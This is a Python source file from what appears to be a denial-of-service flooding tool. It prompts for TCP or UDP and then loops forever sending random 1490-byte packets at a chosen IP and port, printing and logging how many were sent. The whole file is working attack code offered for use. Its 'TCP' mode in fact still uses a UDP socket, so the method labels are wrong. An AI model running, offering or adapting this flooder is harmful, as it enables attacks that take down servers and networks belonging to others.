import os, sys, socket, random, time
from src import print_slow, banner, logs
from colorama import Fore

def clean():
    os.system("clear")

def flood(ip, port):
    try:
        method = 0
        print_slow.slow_type(Fore.CYAN + "\n\n  Enter the attack method: \n\n\n 1. TCP\n\n 2. UDP\n\n")
        while(method < 1 or method > 2):
            method = int(input(Fore.GREEN + "\n ==> " + Fore.YELLOW))
        if method == 1:
            logs.log(0, "method: TCP")
        else:
            logs.log(0, "method: UDP")
        print(Fore.RESET)
        clean()
        banner.flood()
        try:
            logs.log(0, "starting flood attack")
            print_slow.slow_type(Fore.BLUE + "\n\n[Flooding " + ip + ":" + str(port) + "]\nPress ctrl,c to stop the attack\n\n" + Fore.RESET)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            cnt = 0
            bytes = random._urandom(1490)
            attackStart = time.time()
            if method == 1:
                s.connect((ip, port))
                while True:
                    s.send(bytes)
                    cnt += 1
                    if cnt % 5000 == 0:
                        print(Fore.RED , str(cnt) , " sockets sent" , Fore.RESET)
            else:
                while True:
                    s.sendto(bytes, (ip, port))
                    cnt +=1
                    if cnt % 5000 == 0:
                        print(Fore.RED , str(cnt) , " sockets sent" , Fore.RESET)
        except KeyboardInterrupt:
            attackEnd = time.time()
            attackEnd = attackEnd-attackStart
            print(Fore.CYAN , "\n\n----------------------------------------\n  SOCKETS SENT: " , str(cnt) , "  TIME: " , str(int(attackEnd)) , " sec\n----------------------------------------\n" , Fore.GREEN , "\n\n[Press enter to continue]", Fore.RESET)
            l = "sockets sent: " + str(cnt) + "; time: " + str(int(attackEnd)) + " sec"
            logs.log(2, l)
            input()
            s.close()
        except socket.error:
            logs.log(1, "[Error 10]; socket error")
            print(Fore.RED , "\n[Error 10]" , Fore.RESET)
            sys.exit()
        except ConnectionRefusedError:
            logs.log(1, "[Error 11]; connection refused")
            print(Fore.RED , "\n[Error 11]" , Fore.RESET , "\n\nPress enter to continue...")
            input()
        except:
            logs.log(1, "[Error 404]; unexpected error")
            print(Fore.RED , "\n[Error 404]" , Fore.RESET)
            sys.exit()
    except SystemExit:
        sys.exit()
    except KeyboardInterrupt:
        print(Fore.BLUE , "\n[WARNING] Keyboard Interrupt rilevated, exiting...")
    except:
        print(Fore.RED , "\n[Error 404]" , Fore.RESET)
        sys.exit()